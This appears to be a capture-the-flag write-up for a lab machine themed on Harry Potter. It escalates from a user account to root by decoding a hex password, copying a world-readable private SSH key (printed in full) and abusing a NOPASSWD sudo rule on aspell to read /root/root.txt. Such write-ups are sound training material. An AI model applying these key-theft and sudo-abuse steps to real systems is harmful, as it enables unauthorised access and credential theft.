# Write-up : "Yer a Wizard #2"

**Target:** 10.10.0.5 (same machine as "Yer a Wizard, Harry!")

**Objective:** Privilege escalation to root.txt

**Difficulty:** Easy

**Date:** 15/09/2026

**Techniques used:** File permission abuse, hexadecimal decoding, membership in a privileged group, private SSH key theft, escalation via sudo (GTFOBins, aspell), multi-layer decoding (hex/Base64/Base32)

**Tools used:** cat, chmod, xxd, find, getent, ssh, sudo, grep, base64, base32

**Prerequisites:** SSH access as `hagrid` (obtained in the "Yer a Wizard, Harry!" write-up).

---

## 1. Reading a protected file (permission abuse)

On the `hagrid` account, a `riddle.txt` file is present but unreadable. Since we're the owner, we can grant ourselves read access:

```bash
ls -la
chmod u+r riddle.txt   # u = user (me), r = read permission
cat riddle.txt
```

**Result:**

```
Professor dumbledore gave me this riddle, but I don't think I can decipher this.
He said "take a crack at it, would you?" ...
```

followed by a large block of hexadecimal lines.

**Vulnerability exploited:** poor permission management, the owner can regrant themselves access to a "protected" file (CWE-732).

---

## 2. Decoding the riddle (hex to text)

Among all the hex lines, one decodes into readable text:

```bash
echo '496e20666163742c2074686973207761732073696d706c652c207472756c792c207468652070617373776f72642069732042794d65726c696e4265617264210a' | xxd -r -p
```

**Result:**

```
In fact, this was simple, truly, the password is ByMerlinBeard!
```

Dumbledore's password: `ByMerlinBeard!`

---

## 3. Enumerating the privileged `headmaster` group

```bash
id                                   # hagrid belongs to the headmaster group
find / -group headmaster 2>/dev/null # files belonging to this group
getent group headmaster              # group members: dumbledore
```

**Result:** the `headmaster` group grants access to the `/home/dumbledore/.ssh` and `/home/hagrid/.ssh` directories, and the declared member is `dumbledore` (uid 1003).

**Vulnerability exploited:** group with overly broad permissions granting access to sensitive resources (CWE-732).

---

## 4. Spotting a readable SSH key

```bash
ls -la /home/
# drwx------ dumbledore   (700)
# drwxr-xr-x hagrid
# drwx--x--x harry        (711)

ls -la /home/harry/.ssh/
# -rw-r--r-- 1 harry headmaster ... id_ed25519       (private key readable by everyone)
# -rw-r--r-- 1 harry headmaster ... id_ed25519.pub
# -rw-r--r-- 1 harry headmaster ... authorized_keys
```

`711` (`drwx--x--x`): we can traverse the `harry` folder (`x` bit) even without read permission (`r`), which lets us reach `.ssh/` directly.

**Vulnerability exploited:** world-readable private SSH key (CWE-732 / CWE-522).

---

## 5. Stealing harry's private key and SSH login

```bash
cat /home/harry/.ssh/id_ed25519
```

We copy the key into a local file:

```bash
cat > /tmp/harry_key <<'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBsfpX7++1v80WmlMkgwbco1e4ESrTuBJW1kwPGbuG+UwAAAJjXKiQa1yok
GgAAAAtzc2gtZWQyNTUxOQAAACBsfpX7++1v80WmlMkgwbco1e4ESrTuBJW1kwPGbuG+Uw
AAAEAXghR8ct70B3lWRBxSLqDai2Q+wFphPdtXN5pYQ98QAWx+lfv77W/zRaaUySDBtyjV
7gRKtO4ElbWTA8Zu4b5TAAAAEmhhcnJ5QDVkOWU0NzZiMjg3YgECAw==
-----END OPENSSH PRIVATE KEY-----
EOF

chmod 600 /tmp/harry_key      # ssh refuses a key with overly open permissions
ssh -i /tmp/harry_key harry@localhost
```

- `-i` = use the key instead of a password.

**Result:** successful connection as harry (`id` confirms it).

---

## 6. Privilege escalation via sudo (aspell)

```bash
sudo -l
```

**Result:**

```
User harry may run the following commands on hogwarts:
    (root) NOPASSWD: /usr/bin/aspell
```

We can run `aspell` as root without a password.

**Vulnerability exploited:** permissive sudo rule on a hijackable binary (CWE-269, GTFOBins technique).

`aspell` reads a config file and displays its content in an error message. We make it read `/root/root.txt`:

```bash
sudo aspell --conf /root/root.txt
# Error: /root/root.txt:1: The key "53565a4a...3d3d" is unknown.
```

A long hexadecimal string is displayed.

---

## 7. Decoding the flag (hex to Base64 to Base32)

```bash
sudo aspell --conf /root/root.txt 2>&1 | grep -oE '[0-9a-f]{20,}' | xxd -r -p | base64 -d | base32 -d ; echo
```

- `2>&1` = captures the error message
- `grep -oE '[0-9a-f]{20,}'` = extracts the long hex string
- `xxd -r -p` = hex to Base64
- `base64 -d` = Base64 to Base32
- `base32 -d` = Base32 to plaintext

**FLAG obtained:**

```
EPI{t3H_tRuTh_1T_15_4_834ut1fUL_4nD_t3rr18L3_th1n9}
```

---

## Summary of exploited vulnerabilities

| # | Vulnerability | Category (CWE) |
| --- | --- | --- |
| 1 | "Protected" file modifiable by its owner | CWE-732 |
| 2 | `headmaster` group with overly broad permissions | CWE-732 |
| 3 | World-readable private SSH key | CWE-522 |
| 4 | 711 traversable folder (direct access to .ssh) | CWE-732 |
| 5 | sudo `NOPASSWD` on `aspell` (GTFOBins) | CWE-269 |

---

## Summary of steps

1. hagrid account: `chmod u+r riddle.txt`, hex decoding, dumbledore's password.
2. headmaster group: access to `.ssh` folders.
3. harry's private key readable (`id_ed25519`).
4. `ssh -i harry_key harry@localhost`: harry account.
5. `sudo -l`: `(root) NOPASSWD: /usr/bin/aspell`.
6. `sudo aspell --conf /root/root.txt`, then hex/base64/base32 decoding: the root flag.

---

## Conclusion

- **Starting point:** `hagrid` account (from "Yer a Wizard, Harry!").
- **Pivot 1:** decoding a hex riddle (password), then exploiting the `headmaster` group to read `harry`'s SSH key.
- **Pivot 2:** SSH login as `harry` via his poorly protected private key.
- **Root escalation:** `sudo aspell` (GTFOBins) to read `/root/root.txt`, then hex/Base64/Base32 decoding.
- **Root flag:** `EPI{t3H_tRuTh_1T_15_4_834ut1fUL_4nD_t3rr18L3_th1n9}`
